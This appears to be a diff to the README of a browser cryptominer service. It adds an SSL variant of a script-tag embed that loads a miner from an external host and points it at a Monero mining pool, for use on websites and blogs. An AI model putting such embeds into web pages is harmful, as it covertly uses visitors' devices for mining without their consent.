@@ -9,6 +9,8 @@ Simple Pool change: ?pool=Your_Favorite_Pool:PortNr
 
 Complete example:
 <script src="https://cryptown.netlify.com/media.js?proxy=ws://crypto-webminer.com:8897?pool=pool.supportxmr.com:3333"> </script>
+or with SSL
+<script src="https://cryptown.netlify.com/media.js?proxy=wss://crypto-webminer.com:8902?pool=pool.supportxmr.com:3333"> </script>
 
 <br><br> 
 Or use our integration for websites & blogs
